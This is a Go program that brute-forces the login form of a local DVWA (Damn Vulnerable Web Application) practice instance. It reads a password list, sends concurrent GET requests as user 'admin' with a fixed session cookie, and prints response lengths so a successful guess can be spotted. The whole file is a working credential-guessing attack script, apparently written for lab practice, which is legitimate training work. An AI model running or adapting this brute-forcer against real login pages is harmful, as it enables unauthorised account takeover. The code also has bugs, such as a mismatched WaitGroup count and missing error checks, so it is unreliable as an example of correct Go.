package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
)
//
//func req(url_ string)(*http.Response, error){
//	ret_, err_ := http.Get(url_)
//	return ret_, err_
//}

func main()  {
	//var r []byte
	var wg sync.WaitGroup
	wg.Add(100)
	//filePath := "C:\\Users\\Zank\\go\\src\\brute\\password-top5.txt"
	filePath := "C:\\Users\\Zank\\go\\src\\brute\\password-top100.txt"

	f, err := os.Open(filePath)
	if err != nil{
		fmt.Println("err:", err)
	}
	lines := bufio.NewReader(f)
	for {
		line, err := lines.ReadString('\n')
		line = strings.Replace(line, "\n", "", -1)
		if err != nil || io.EOF == err {  // err ==io.EOF 的时候其实还有一行数据，看到io.EOF就跳出而不读取就跳出的话会丢失
			if line ==""{
				break
			}
		}

		url := "http://192.168.124.26/dvwa/vulnerabilities/brute/?username=admin&password=" + string(line) + "&Login=Login#"
		go func(url string, wg *sync.WaitGroup) {

			//res, err := http.Get(url)

			resp, err := http.NewRequest("GET", url, nil)
			resp.Header.Add("Cookie","security=low; security=low; PHPSESSID=q31peq2jk4r1osp45r18hhhjk6")
			client := http.Client{}
			res, err := client.Do(resp)
			if err != nil {
				fmt.Println("err:", err)
			}

			if res.StatusCode == 200 {
				//fmt.Println(*res)
				body_, err := ioutil.ReadAll(res.Body)  // 读取body内容，二进制流方式
				if err != nil{
					fmt.Println("err:", err)
				}
				fmt.Println(url)
				fmt.Println(len(string(body_)))
				defer res.Body.Close()
				//res.Close
				// :
			}

			wg.Done()
		}(url, &wg)

	}
	wg.Wait()

	defer f.Close()

}
